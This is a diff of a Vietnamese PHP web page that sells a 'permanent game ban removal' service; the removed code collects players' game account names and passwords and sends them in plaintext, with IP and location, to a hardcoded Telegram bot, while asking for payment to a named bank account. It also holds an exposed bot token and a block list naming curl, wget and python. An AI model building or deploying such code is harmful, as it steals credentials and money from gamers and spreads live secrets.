@@ -1,857 +1,986 @@
-<?php
-// ============================================
-// TOOL MỞ BAND VĨNH VIỄN - PHP VERSION
-// Bảo mật Server-Side - Không thể crack
-// ============================================
-session_start();
-error_reporting(0);
-ini_set('display_errors', 0);
-
-// ============================================
-// CONFIG
-// ============================================
-define('TELEGRAM_BOT_TOKEN', '8732357215:AAFmcjicU5ejU7xZ70vAmkG8Coqk-iDY3VI');
-define('TELEGRAM_CHAT_ID', '8998147404');
-define('TELEGRAM_API', 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN);
-define('SITE_NAME', 'Tool Mở Band Vĩnh Viễn');
-define('VERSION', '5.0 PHP');
-define('BANK_ACCOUNT', '0644612345555');
-define('BANK_NAME', 'MB Bank (Quân Đội)');
-define('BANK_OWNER', 'Tran Nguyen Duc Minh');
-define('CONTACT_TELEGRAM', '@admin_toolband');
-
-// ============================================
-// DATABASE CONFIG (Sử dụng SQLite)
-// ============================================
-$dbFile = __DIR__ . '/toolband.db';
-$db = new SQLite3($dbFile);
-
-// Tạo bảng nếu chưa có
-$db->exec("CREATE TABLE IF NOT EXISTS orders (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    order_id TEXT UNIQUE,
-    game TEXT,
-    server TEXT,
-    uid TEXT,
-    account TEXT,
-    password TEXT,
-    plan TEXT,
-    price INTEGER,
-    status TEXT DEFAULT 'pending',
-    ip TEXT,
-    device_id TEXT,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-    approved_at DATETIME,
-    completed_at DATETIME
-)");
-
-$db->exec("CREATE TABLE IF NOT EXISTS banned_ips (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    ip TEXT UNIQUE,
-    reason TEXT,
-    banned_by TEXT,
-    duration TEXT DEFAULT 'permanent',
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-)");
-
-$db->exec("CREATE TABLE IF NOT EXISTS security_logs (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    type TEXT,
-    ip TEXT,
-    details TEXT,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-)");
-
-$db->exec("CREATE TABLE IF NOT EXISTS site_settings (
-    key TEXT PRIMARY KEY,
-    value TEXT
-)");
-
-// ============================================
-// FUNCTIONS
-// ============================================
-
-// Lấy IP thật
-function getUserIP() {
-    $headers = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'HTTP_CF_CONNECTING_IP', 'REMOTE_ADDR'];
-    foreach ($headers as $header) {
-        if (!empty($_SERVER[$header])) {
-            $ips = explode(',', $_SERVER[$header]);
-            $ip = trim($ips[0]);
-            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
-        }
-    }
-    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-}
-
-// Lấy vị trí IP
-function getIPLocation($ip) {
-    try {
-        $json = @file_get_contents("https://ipapi.co/{$ip}/json/");
-        return $json ? json_decode($json, true) : ['city' => 'Unknown', 'country_name' => 'Unknown', 'org' => 'N/A'];
-    } catch (Exception $e) {
-        return ['city' => 'Unknown', 'country_name' => 'Unknown', 'org' => 'N/A'];
-    }
-}
-
-// Gửi Telegram
-function sendTelegram($message, $parseMode = 'HTML') {
-    $url = TELEGRAM_API . "/sendMessage";
-    $data = json_encode([
-        'chat_id' => TELEGRAM_CHAT_ID,
-        'text' => $message,
-        'parse_mode' => $parseMode
-    ]);
-    
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return json_decode($result, true);
-}
-
-// Gửi ảnh Telegram
-function sendPhotoTelegram($photoPath, $caption = '') {
-    $url = TELEGRAM_API . "/sendPhoto";
-    
-    $post = [
-        'chat_id' => TELEGRAM_CHAT_ID,
-        'photo' => new CURLFile($photoPath),
-        'caption' => $caption
-    ];
-    
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return json_decode($result, true);
-}
-
-// Tạo mã đơn hàng
-function generateOrderId($type = 'ACC') {
-    return strtoupper($type . '-' . substr(md5(uniqid()), 0, 8));
-}
-
-// Kiểm tra IP bị ban
-function isIPBanned($ip) {
-    global $db;
-    $stmt = $db->prepare("SELECT * FROM banned_ips WHERE ip = :ip");
-    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
-    $result = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
-    return $result ?: false;
-}
-
-// Ban IP
-function banIP($ip, $reason, $bannedBy = 'System') {
-    global $db;
-    $stmt = $db->prepare("INSERT OR REPLACE INTO banned_ips (ip, reason, banned_by) VALUES (:ip, :reason, :by)");
-    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
-    $stmt->bindValue(':reason', $reason, SQLITE3_TEXT);
-    $stmt->bindValue(':by', $bannedBy, SQLITE3_TEXT);
-    return $stmt->execute();
-}
-
-// Lấy setting
-function getSetting($key, $default = '') {
-    global $db;
-    $stmt = $db->prepare("SELECT value FROM site_settings WHERE key = :key");
-    $stmt->bindValue(':key', $key, SQLITE3_TEXT);
-    $result = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
-    return $result ? $result['value'] : $default;
-}
-
-// Lưu setting
-function setSetting($key, $value) {
-    global $db;
-    $stmt = $db->prepare("INSERT OR REPLACE INTO site_settings (key, value) VALUES (:key, :value)");
-    $stmt->bindValue(':key', $key, SQLITE3_TEXT);
-    $stmt->bindValue(':value', $value, SQLITE3_TEXT);
-    return $stmt->execute();
-}
-
-// Log bảo mật
-function securityLog($type, $details) {
-    global $db;
-    $ip = getUserIP();
-    $stmt = $db->prepare("INSERT INTO security_logs (type, ip, details) VALUES (:type, :ip, :details)");
-    $stmt->bindValue(':type', $type, SQLITE3_TEXT);
-    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
-    $stmt->bindValue(':details', json_encode($details, JSON_UNESCAPED_UNICODE), SQLITE3_TEXT);
-    $stmt->execute();
-}
-
-// Phát hiện crack
-function detectCrack() {
-    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $indicators = [];
-    
-    // Bot/Curl detection
-    if (empty($ua) || preg_match('/curl|wget|python|bot|crawl|spider/i', $ua)) {
-        $indicators[] = 'Bot/Scanner detected: ' . $ua;
-    }
-    
-    // SQL Injection detection
-    $input = json_encode([$_GET, $_POST, $_COOKIE]);
-    if (preg_match('/(union|select|insert|delete|update|drop|alter|exec|eval)/i', $input)) {
-        $indicators[] = 'SQL Injection attempt';
-    }
-    
-    // Rate limiting
-    $ip = getUserIP();
-    $rateFile = sys_get_temp_dir() . '/rate_' . md5($ip) . '.json';
-    $requests = [];
-    if (file_exists($rateFile)) {
-        $requests = json_decode(file_get_contents($rateFile), true) ?: [];
-    }
-    $requests = array_filter($requests, fn($t) => time() - $t < 60);
-    $requests[] = time();
-    file_put_contents($rateFile, json_encode(array_slice($requests, -50)));
-    
-    if (count($requests) > 30) {
-        $indicators[] = 'Rate limit exceeded';
-    }
-    
-    if (!empty($indicators)) {
-        $alert = "🚨 <b>CẢNH BÁO BẢO MẬT PHP</b>\n";
-        $alert .= "⏰ " . date('Y-m-d H:i:s') . "\n";
-        $alert .= "🌐 IP: <code>{$ip}</code>\n";
-        $alert .= "📝 " . implode("\n", $indicators);
-        
-        sendTelegram($alert);
-        securityLog('CRACK_ATTEMPT', ['indicators' => $indicators]);
-        banIP($ip, implode(' | ', $indicators));
-        
-        header('HTTP/1.0 403 Forbidden');
-        die("<h1>403 Forbidden</h1><p>Your IP has been logged.</p>");
-    }
-}
-
-// ============================================
-// XỬ LÝ REQUEST
-// ============================================
-$userIP = getUserIP();
-
-// Kiểm tra IP ban
-$banInfo = isIPBanned($userIP);
-if ($banInfo) {
-    header('HTTP/1.0 403 Forbidden');
-    die("<!DOCTYPE html><html><head><title>403</title></head><body style='background:#000;color:#f00;text-align:center;padding:50px;'><h1>🚫 IP BỊ CHẶN</h1><p>IP: {$userIP}</p><p>Lý do: {$banInfo['reason']}</p></body></html>");
-}
-
-// Phát hiện crack
-detectCrack();
-
-// Xử lý POST request (submit form)
-$message = '';
-$messageType = '';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_order'])) {
-    // Validate
-    $uid = trim($_POST['uid'] ?? '');
-    $account = trim($_POST['account'] ?? '');
-    $password = trim($_POST['password'] ?? '');
-    $game = trim($_POST['game'] ?? 'freefire');
-    $server = trim($_POST['server'] ?? 'vietnam');
-    $plan = trim($_POST['plan'] ?? 'basic');
-    $captcha = intval($_POST['captcha'] ?? 0);
-    $captchaResult = intval($_POST['captcha_result'] ?? 0);
-    
-    $prices = ['basic' => 150000, 'vip' => 300000, 'ultimate' => 500000];
-    $price = $prices[$plan] ?? 150000;
-    
-    if (empty($uid) || empty($account) || empty($password)) {
-        $message = '❌ Vui lòng nhập đầy đủ thông tin!';
-        $messageType = 'error';
-    } elseif ($captcha !== $captchaResult) {
-        $message = '❌ Mã xác nhận không đúng!';
-        $messageType = 'error';
-    } else {
-        // Tạo đơn hàng
-        $orderId = generateOrderId();
-        
-        // Lưu database
-        $stmt = $db->prepare("INSERT INTO orders (order_id, game, server, uid, account, password, plan, price, ip) VALUES (:oid, :game, :server, :uid, :acc, :pass, :plan, :price, :ip)");
-        $stmt->bindValue(':oid', $orderId, SQLITE3_TEXT);
-        $stmt->bindValue(':game', $game, SQLITE3_TEXT);
-        $stmt->bindValue(':server', $server, SQLITE3_TEXT);
-        $stmt->bindValue(':uid', $uid, SQLITE3_TEXT);
-        $stmt->bindValue(':acc', $account, SQLITE3_TEXT);
-        $stmt->bindValue(':pass', $password, SQLITE3_TEXT);
-        $stmt->bindValue(':plan', $plan, SQLITE3_TEXT);
-        $stmt->bindValue(':price', $price, SQLITE3_INTEGER);
-        $stmt->bindValue(':ip', $userIP, SQLITE3_TEXT);
-        $stmt->execute();
-        
-        // Gửi Telegram
-        $msg = "🔔 <b>ĐƠN HÀNG MỚI #{$orderId}</b>\n";
-        $msg .= "━━━━━━━━━━━━━━━━━━\n";
-        $msg .= "🎮 Game: {$game}\n";
-        $msg .= "🌐 Server: {$server}\n";
-        $msg .= "👤 UID: <code>{$uid}</code>\n";
-        $msg .= "📧 TK: {$account}\n";
-        $msg .= "🔐 MK: <code>{$password}</code>\n";
-        $msg .= "💎 Gói: {$plan}\n";
-        $msg .= "💰 Giá: " . number_format($price) . "đ\n";
-        $msg .= "🌐 IP: <code>{$userIP}</code>\n";
-        $msg .= "⏰ " . date('Y-m-d H:i:s');
-        
-        sendTelegram($msg);
-        
-        // Xử lý upload ảnh
-        if (isset($_FILES['payment_image']) && $_FILES['payment_image']['error'] === UPLOAD_ERR_OK) {
-            $uploadDir = __DIR__ . '/uploads/';
-            if (!is_dir($uploadDir)) mkdir($uploadDir, 0755, true);
-            
-            $ext = pathinfo($_FILES['payment_image']['name'], PATHINFO_EXTENSION);
-            $fileName = $orderId . '.' . $ext;
-            $filePath = $uploadDir . $fileName;
-            
-            if (move_uploaded_file($_FILES['payment_image']['tmp_name'], $filePath)) {
-                sendPhotoTelegram($filePath, "📸 Ảnh CK - #{$orderId}");
-            }
-        }
-        
-        $message = "✅ Đơn hàng #{$orderId} đã được gửi! Vui lòng chờ admin duyệt.";
-        $messageType = 'success';
-        
-        // Gửi thông báo cho admin
-        $location = getIPLocation($userIP);
-        sendTelegram("📍 <b>Vị trí KH:</b> {$location['city']}, {$location['country_name']}\n🏢 ISP: {$location['org']}");
-    }
-}
-
-// ============================================
-// TẠO CAPTCHA
-// ============================================
-$a = rand(1, 10);
-$b = rand(1, 10);
-$captchaResult = $a + $b;
-$captchaQuestion = "{$a} + {$b}";
-
-// ============================================
-// GIÁ THEO GAME/SERVER
-// ============================================
-$prices = [
-    'basic' => ['name' => 'Cơ Bản', 'price' => 150000, 'time' => '30-45'],
-    'vip' => ['name' => 'VIP', 'price' => 300000, 'time' => '10-15'],
-    'ultimate' => ['name' => 'Ultimate', 'price' => 500000, 'time' => '5-10']
-];
-
-// ============================================
-// GIAO DIỆN
-// ============================================
-?>
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title><?php echo SITE_NAME; ?> v<?php echo VERSION; ?></title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <style>
-        :root {
-            --bg-primary: #0a0f1e;
-            --bg-secondary: #141b2b;
-            --bg-card: rgba(20, 28, 45, 0.85);
-            --text-primary: #eef5ff;
-            --text-secondary: #b0d4ff;
-            --accent: #00e6ff;
-            --gold: #ffd966;
-            --success: #2ecc71;
-            --danger: #ff6b6b;
-            --warning: #f39c12;
-            --border: rgba(0, 255, 200, 0.25);
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Quản Trị - Mở Band Vĩnh Viễn</title>
+  <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  
+  <style>
+    :root {
+      --bg-primary: #0a0f1e;
+      --bg-secondary: #141b2b;
+      --bg-card: rgba(20, 28, 45, 0.85);
+      --text-primary: #eef5ff;
+      --text-secondary: #b0d4ff;
+      --accent: #00e6ff;
+      --success: #2ecc71;
+      --danger: #ff6b6b;
+      --warning: #f39c12;
+      --border: rgba(0, 255, 200, 0.25);
+    }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
-        body {
-            font-family: 'Segoe UI', 'Roboto', system-ui, sans-serif;
-            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
-            color: var(--text-primary);
-            min-height: 100vh;
-            padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-            -webkit-user-select: none;
-            user-select: none;
-        }
+    body {
+      font-family: 'Segoe UI', 'Roboto', system-ui, sans-serif;
+      background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
+      color: var(--text-primary);
+      line-height: 1.6;
+      min-height: 100vh;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
 
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background-image: linear-gradient(rgba(0, 255, 196, 0.03) 1px, transparent 1px),
-                              linear-gradient(90deg, rgba(0, 255, 196, 0.03) 1px, transparent 1px);
-            background-size: 40px 40px;
-            pointer-events: none;
-            z-index: 0;
-        }
+    /* Admin security overlay - bảo vệ trang admin */
+    #admin-security-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(10, 15, 30, 0.98);
+      z-index: 99999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+    }
+    #admin-security-overlay .lock-icon {
+      font-size: 4rem;
+      color: var(--accent);
+      margin-bottom: 20px;
+      animation: pulse 2s infinite;
+    }
+    #admin-security-overlay h2 {
+      color: var(--text-primary);
+      margin-bottom: 10px;
+    }
+    #admin-security-overlay p {
+      color: #9aa9c1;
+      margin-bottom: 20px;
+    }
+    #admin-security-overlay .input-field {
+      max-width: 300px;
+      width: 90%;
+      margin: 10px auto;
+    }
+    #admin-security-overlay .btn-submit {
+      max-width: 300px;
+      width: 90%;
+      margin: 10px auto;
+    }
 
-        .main-wrapper { max-width: 900px; margin: 0 auto; position: relative; z-index: 2; }
+    .main-wrapper { max-width: 1200px; margin: 0 auto; position: relative; z-index: 2; }
+    .container {
+      width: 100%; background: var(--bg-card); backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid var(--border); border-radius: 36px; padding: 30px 25px 35px;
+      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5); margin-bottom: 30px;
+    }
 
-        .container {
-            background: var(--bg-card);
-            backdrop-filter: blur(20px);
-            border: 1px solid var(--border);
-            border-radius: 36px;
-            padding: 30px 25px 35px;
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5);
-            margin-bottom: 30px;
-        }
+    .header {
+      display: flex; justify-content: space-between; align-items: center;
+      flex-wrap: wrap; gap: 15px; margin-bottom: 25px;
+    }
 
-        h1 {
-            font-size: 2.2rem;
-            font-weight: 800;
-            background: linear-gradient(to right, #ffd966, #ffb347, #ff8c42);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            text-align: center;
-        }
+    .tabs {
+      display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px;
+    }
+    .tab-btn {
+      padding: 10px 25px; border-radius: 30px; border: 2px solid #2e405b;
+      background: transparent; color: #9aa9c1; cursor: pointer;
+      font-weight: 600; transition: 0.3s;
+    }
+    .tab-btn.active {
+      border-color: var(--accent); background: rgba(0, 230, 255, 0.1);
+      color: white;
+    }
+    .tab-btn:hover { border-color: var(--accent); }
 
-        .header-info {
-            text-align: right;
-            margin-bottom: 10px;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: flex-end;
-            gap: 8px;
-            align-items: center;
-        }
+    .stats {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 15px; margin-bottom: 25px;
+    }
+    .stat-card {
+      background: rgba(10, 20, 38, 0.8); border: 1px solid #2e405b;
+      border-radius: 20px; padding: 15px 20px; text-align: center;
+    }
+    .stat-card .number { font-size: 2rem; font-weight: bold; color: var(--accent); }
+    .stat-card .label { font-size: 0.85rem; color: #9aa9c1; }
+    .stat-card .number.danger { color: var(--danger); }
+    .stat-card .number.success { color: var(--success); }
+    .stat-card .number.warning { color: var(--warning); }
 
-        .header-badge {
-            padding: 5px 12px;
-            border-radius: 15px;
-            font-size: 0.75rem;
-            font-weight: bold;
-        }
+    .order-card {
+      background: rgba(10, 20, 38, 0.6); border: 1px solid #2e405b;
+      border-radius: 20px; padding: 20px; margin: 15px 0;
+      transition: 0.3s;
+    }
+    .order-card:hover { border-color: var(--accent); }
+    .order-card.pending { border-left: 4px solid var(--warning); }
+    .order-card.approved { border-left: 4px solid var(--success); }
+    .order-card.rejected { border-left: 4px solid var(--danger); }
+    .order-card.completed { border-left: 4px solid var(--accent); }
 
-        .section-title {
-            font-size: 1.3rem;
-            font-weight: 700;
-            color: var(--accent);
-            margin: 20px 0 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+    .order-header {
+      display: flex; justify-content: space-between; align-items: center;
+      flex-wrap: wrap; gap: 10px; margin-bottom: 10px;
+    }
+    .order-id { font-weight: bold; font-size: 1.1rem; color: var(--accent); }
+    .order-status {
+      padding: 4px 12px; border-radius: 20px; font-size: 0.75rem; font-weight: bold;
+    }
+    .status-pending { background: var(--warning); color: #0a0f1e; }
+    .status-approved { background: var(--success); color: #0a0f1e; }
+    .status-rejected { background: var(--danger); color: white; }
+    .status-completed { background: var(--accent); color: #0a0f1e; }
 
-        .flex-center {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 10px;
-        }
+    .order-details {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 10px; margin: 10px 0; font-size: 0.9rem;
+    }
+    .order-details .detail { color: #9aa9c1; }
+    .order-details .detail strong { color: var(--text-primary); }
 
-        .btn-option {
-            background: #1d2c45;
-            border: 2px solid #2e405b;
-            border-radius: 40px;
-            padding: 10px 22px;
-            font-weight: 600;
-            color: #cfdefa;
-            cursor: pointer;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.95rem;
-        }
+    .order-actions {
+      display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap;
+    }
 
-        .btn-option.active {
-            background: #0077ff;
-            border-color: #00e6ff;
-            color: white;
-            box-shadow: 0 0 20px rgba(0, 119, 255, 0.5);
-        }
+    .btn-admin {
+      padding: 8px 20px; border-radius: 30px; border: none;
+      font-weight: 600; cursor: pointer; transition: 0.3s;
+      display: inline-flex; align-items: center; gap: 6px;
+    }
+    .btn-approve { background: var(--success); color: #0a0f1e; }
+    .btn-approve:hover { transform: scale(1.05); }
+    .btn-reject { background: var(--danger); color: white; }
+    .btn-reject:hover { transform: scale(1.05); }
+    .btn-refresh { background: var(--accent); color: #0a0f1e; }
+    .btn-refresh:hover { transform: scale(1.05); }
+    .btn-ban { background: #e74c3c; color: white; }
+    .btn-ban:hover { transform: scale(1.05); }
+    .btn-unban { background: #2ecc71; color: #0a0f1e; }
+    .btn-unban:hover { transform: scale(1.05); }
+    .btn-logout { background: #95a5a6; color: #0a0f1e; }
+    .btn-logout:hover { transform: scale(1.05); }
 
-        .game-option.active { background: #e74c3c; border-color: #ff6b6b; }
-        .payment-option.active { background: #f39c12; border-color: #f1c40f; color: #0a0f1e; }
+    .sync-status {
+      position: fixed; top: 20px; right: 20px; background: rgba(46, 204, 113, 0.1);
+      border: 1px solid #2ecc71; border-radius: 20px; padding: 10px 15px;
+      z-index: 1000; font-size: 0.85rem; display: flex; align-items: center; gap: 8px;
+    }
+    .sync-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+    .sync-connected { background: #2ecc71; }
+    .sync-disconnected { background: #e74c3c; }
+    .sync-syncing { background: #f39c12; animation: blink 1s infinite; }
 
-        .pricing-table {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
-        }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
 
-        .plan {
-            background: rgba(10, 20, 38, 0.8);
-            border: 2px solid #2e405b;
-            border-radius: 20px;
-            padding: 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: 0.3s;
-        }
+    .back-link {
+      display: inline-flex; align-items: center; gap: 8px;
+      color: var(--text-secondary); text-decoration: none;
+      padding: 8px 16px; border: 1px solid #2e405b; border-radius: 30px;
+      transition: 0.3s;
+    }
+    .back-link:hover { border-color: var(--accent); color: white; }
 
-        .plan:hover { transform: translateY(-3px); }
-        .plan.selected {
-            border-color: #f39c12;
-            background: rgba(243, 156, 18, 0.15);
-            box-shadow: 0 0 20px rgba(243, 156, 18, 0.3);
-        }
+    .filter-bar {
+      display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0;
+    }
+    .filter-bar select, .filter-bar input {
+      background: #0b1322; border: 1px solid #2e405b; border-radius: 30px;
+      padding: 10px 18px; color: white; font-family: inherit;
+      outline: none; min-width: 150px;
+    }
+    .filter-bar select:focus, .filter-bar input:focus {
+      border-color: var(--accent);
+    }
 
-        .plan-price {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #ffd966;
-        }
+    .image-thumb {
+      max-width: 100px; max-height: 100px; border-radius: 8px; cursor: pointer;
+      border: 1px solid #2e405b; transition: 0.3s;
+    }
+    .image-thumb:hover { transform: scale(1.05); border-color: var(--accent); }
 
-        .input-field {
-            width: 100%;
-            padding: 14px 18px;
-            border-radius: 40px;
-            border: 1px solid #3f5580;
-            background: #0b1322;
-            color: white;
-            font-size: 1rem;
-            outline: none;
-            font-family: inherit;
-            transition: 0.2s;
-        }
+    .empty-state {
+      text-align: center; padding: 50px 20px; color: #9aa9c1;
+    }
+    .empty-state i { font-size: 3rem; margin-bottom: 15px; }
 
-        .input-field:focus {
-            border-color: #00c8ff;
-            box-shadow: 0 0 12px rgba(0, 119, 255, 0.3);
-        }
+    .visitor-item {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px 15px; background: rgba(10,20,38,0.4);
+      border-radius: 12px; margin: 5px 0; border: 1px solid #2e405b;
+    }
+    .visitor-item .ip { font-weight: bold; color: var(--accent); }
+    .visitor-item .location { color: #9aa9c1; font-size: 0.85rem; }
+    .visitor-item .time { color: #6c7e9e; font-size: 0.75rem; }
 
-        .btn-submit {
-            background: linear-gradient(180deg, #00c9a7 0%, #0077b6 100%);
-            border: none;
-            border-radius: 60px;
-            padding: 16px 25px;
-            width: 100%;
-            font-weight: 800;
-            font-size: 1.4rem;
-            color: white;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
+    .banned-ip-item {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px 15px; background: rgba(231,76,60,0.1);
+      border-radius: 12px; margin: 5px 0; border: 1px solid #e74c3c;
+    }
 
-        .btn-submit:hover {
-            transform: scale(1.02);
-            box-shadow: 0 15px 35px rgba(0, 166, 255, 0.5);
-        }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
 
-        .info-box {
-            border-radius: 24px;
-            padding: 18px;
-            margin: 20px 0;
-        }
+    .security-log-item {
+      padding: 8px 12px; background: rgba(10,20,38,0.3);
+      border-radius: 8px; margin: 3px 0; font-size: 0.85rem;
+      border-left: 3px solid var(--warning);
+      color: #9aa9c1;
+    }
+    .security-log-item .event { color: var(--text-primary); font-weight: bold; }
 
-        .info-box.bank {
-            background: rgba(0, 180, 216, 0.1);
-            border: 1px solid #00c8ff;
-        }
-
-        .info-box.card {
-            background: rgba(243, 156, 18, 0.1);
-            border: 1px solid #f39c12;
-        }
-
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin: 8px 0;
-        }
-
-        .file-upload {
-            background: rgba(10, 20, 38, 0.8);
-            border: 2px dashed #3f5580;
-            border-radius: 20px;
-            padding: 30px 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .file-upload:hover {
-            border-color: #00c8ff;
-            background: rgba(0, 200, 255, 0.05);
-        }
-
-        .hidden { display: none; }
-
-        .alert {
-            padding: 15px 20px;
-            border-radius: 15px;
-            margin: 15px 0;
-            font-weight: 600;
-        }
-
-        .alert-success {
-            background: rgba(46, 204, 113, 0.15);
-            border: 1px solid #2ecc71;
-            color: #2ecc71;
-        }
-
-        .alert-error {
-            background: rgba(255, 107, 107, 0.15);
-            border: 1px solid #ff6b6b;
-            color: #ff6b6b;
-        }
-
-        .footer-text {
-            text-align: center;
-            color: #4a5a7a;
-            font-size: 0.75rem;
-            margin-top: 20px;
-        }
-
-        @media (max-width: 600px) {
-            .container { padding: 20px 15px; }
-            h1 { font-size: 1.8rem; }
-            .pricing-table { grid-template-columns: 1fr; }
-            .btn-option { font-size: 0.8rem; padding: 8px 15px; }
-        }
-    </style>
+    @media (max-width: 600px) {
+      .container { padding: 15px; }
+      .stats { grid-template-columns: 1fr 1fr; }
+      .order-details { grid-template-columns: 1fr; }
+      .header { flex-direction: column; align-items: stretch; }
+      .tabs { justify-content: center; }
+      .tab-btn { padding: 8px 15px; font-size: 0.8rem; }
+      #admin-security-overlay .lock-icon { font-size: 3rem; }
+    }
+  </style>
 </head>
 <body>
-    <div class="main-wrapper">
-        <div class="container">
-            <!-- Header -->
-            <div class="header-info">
-                <span class="header-badge" style="background:rgba(155,89,182,0.1);border:1px solid #9b59b6;">
-                    <i class="fas fa-fingerprint"></i> <?php echo substr(md5($userIP), 0, 8); ?>
-                </span>
-                <span class="header-badge" style="background:linear-gradient(135deg,#f39c12,#e74c3c);color:white;">
-                    <i class="fas fa-crown"></i> PHP v<?php echo VERSION; ?>
-                </span>
-                <span class="header-badge" style="background:rgba(0,200,255,0.1);border:1px solid #00c8ff;">
-                    <i class="fas fa-globe"></i> <?php echo htmlspecialchars($userIP); ?>
-                </span>
-            </div>
+  <!-- Admin Security Overlay - Bảo vệ trang admin -->
+  <div id="admin-security-overlay">
+    <div class="lock-icon">🔐</div>
+    <h2>Bảo mật Admin</h2>
+    <p>Vui lòng xác thực để truy cập trang quản trị</p>
+    <input type="password" id="admin-login-password" class="input-field" 
+           placeholder="Nhập mật khẩu admin..." 
+           style="text-align:center;"
+           onkeypress="if(event.key==='Enter')adminLogin()">
+    <button class="btn-submit" onclick="adminLogin()" style="max-width:300px;">
+      <i class="fas fa-unlock"></i> Xác thực
+    </button>
+    <p style="color:#6c7e9e; font-size:0.8rem; margin-top:15px;">
+      <i class="fas fa-info-circle"></i> Liên hệ admin nếu quên mật khẩu
+    </p>
+  </div>
 
-            <!-- Logo -->
-            <div style="text-align:center;font-size:3.5rem;color:#00e6ff;margin-bottom:10px;">
-                <i class="fas fa-shield-haltered"></i>
-            </div>
-            
-            <h1>MỞ BAND VĨNH VIỄN</h1>
-            <div style="text-align:center;color:#b0d4ff;margin-bottom:20px;">
